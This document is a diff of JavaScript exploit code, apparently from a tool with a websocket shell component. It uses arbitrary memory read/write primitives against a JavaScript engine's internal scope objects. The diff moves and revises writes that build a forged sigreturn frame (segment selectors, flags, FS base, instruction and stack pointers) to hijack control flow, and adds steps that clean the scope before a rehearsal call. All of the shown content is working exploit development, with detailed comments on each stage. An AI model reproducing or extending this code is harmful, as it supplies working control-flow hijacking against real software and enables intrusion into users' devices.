@@ -5498,18 +5498,6 @@ function _startWsShell(){
            * KILL = the stale +0x480 (the loader boot's 0x881090080).
            * srop27 writes ONLY the gates + the FS base. NO other writes. */
           reply.vm38='0x'+S.absRead(S.fakeScope+0x38n,8)[0].toString(16);
-          S.absWrite(CAP+0x0C0n,0x1B001300000000n);  /* the 814a fs/gs selectors */
-          S.absWrite(CAP+0x0C8n,0n);
-          S.absWrite(CAP+0x0D0n,0n);                 /* the D0 gate (<8, the 814b shape) */
-          S.absWrite(CAP+0x0D8n,0n);
-          S.absWrite(CAP+0x0E8n,0x43n);              /* CS */
-          S.absWrite(CAP+0x0F0n,0x202n);             /* RFLAGS */
-          S.absWrite(CAP+0x100n,0x3Bn);              /* SS */
-          S.absWrite(CAP+0x110n,0x10002n);           /* type */
-          S.absWrite(CAP+0x118n,0x20001n);           /* subtype */
-          S.absWrite(CAP+0x480n,fsB);                /* THE FS BASE FIX */
-          S.absWrite(CAP+0x488n,0n);                 /* GS base */
-          reply.recordSurgical=true;
           function SF_CALL(target,scope){
             if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,scope||CAP);
             var orig=S.absRead(S.neEntry.addr+0x28n,8)[0];
@@ -5522,27 +5510,46 @@ function _startWsShell(){
           }
           var isRT=(msg.mode==='rt');
 
-          /* (3) THE INSTALL-CONTROL (the ic = the ONLY srop27 mode). THE
-           * REHEARSAL FIRST: gettimeofday through the scope (the E2 shape -
-           * the call-safe path, the scope's +0x00-0xC0 untouched by us) -
-           * its push writes the return address at [cfr-0x328] and its ret
-           * LEAVES the value. THE IC: RIP = that return address, RSP =
+          /* (3) THE INSTALL-CONTROL (the ic = the ONLY srop29 mode). THE
+           * SEQUENCE: (a) the head cleaning - the rawcall zeroes the
+           * scope's +0x00-0x20 before EVERY call (the stale JSValue
+           * encodings from earlier calls = the engine's first-touch
+           * death; the preflight left them dirty and every SF_CALL that
+           * skipped this inherited them); (b) the rehearsal on the
+           * PRISTINE scope - gettimeofday (the E2's exact shape), its
+           * push writes the return address at [cfr-0x328] and its ret
+           * LEAVES the value; (c) the gates - the sigreturn kernel path
+           * reads ONLY these, written into the slots AFTER the rehearsal
+           * so the rehearsal ran on the pristine state; (d) the ic
+           * patches: RIP = the rehearsal's return address, RSP =
            * cfr-0x320 - the kernel restores the scope's own saved state
-           * (+0x48-0x108, untouched by us) with OUR FS base and OUR
-           * RIP/RSP - the pure resume, no target runs. */
+           * with OUR FS base and OUR RIP/RSP - the pure resume, no
+           * target runs. SURVIVES = the install + the FS base PROVEN. */
           var isIC=(msg.mode==='ic');
           if(isIC){
+            for(var hz=0;hz<4;hz++)S.absWrite(CAP+BigInt(hz*8),0n);
             SF_CALL(lkS+0xB50n,CAP);
             var retv=S.absRead(retSlotAddr,8)[0];
             reply.icRet='0x'+retv.toString(16);
             if(!(retv>=0x800000000n&&retv<0x1000000000n)){
               reply.err='retSlot still not a code return after the rehearsal';break;
             }
+            S.absWrite(CAP+0x0C0n,0x1B001300000000n);  /* the 814a fs/gs selectors */
+            S.absWrite(CAP+0x0C8n,0n);
+            S.absWrite(CAP+0x0D0n,0n);                 /* the D0 gate (<8, the 814b shape) */
+            S.absWrite(CAP+0x0D8n,0n);
+            S.absWrite(CAP+0x0E8n,0x43n);              /* CS */
+            S.absWrite(CAP+0x0F0n,0x202n);             /* RFLAGS */
+            S.absWrite(CAP+0x100n,0x3Bn);              /* SS */
+            S.absWrite(CAP+0x110n,0x10002n);           /* type */
+            S.absWrite(CAP+0x118n,0x20001n);           /* subtype */
+            S.absWrite(CAP+0x480n,fsB);                /* THE FS BASE FIX */
+            S.absWrite(CAP+0x488n,0n);                 /* GS base */
             S.absWrite(CAP+0x0E0n,retv);
             S.absWrite(CAP+0x0F8n,retSlotAddr+0x8n);
             SF('3 INSTALL-CONTROL RIP=[retSlot post-rehearsal] RSP=cfr-0x320 (no target)');
           }else{
-            reply.err='srop27 = the ic mode ONLY (the rt/real return after the install is proven)';break;
+            reply.err='srop29 = the ic mode ONLY (the rt/real return after the install is proven)';break;
           }
 
           /* (4) THE INSTALL: sigreturn reads the record at RDI=CAP. */
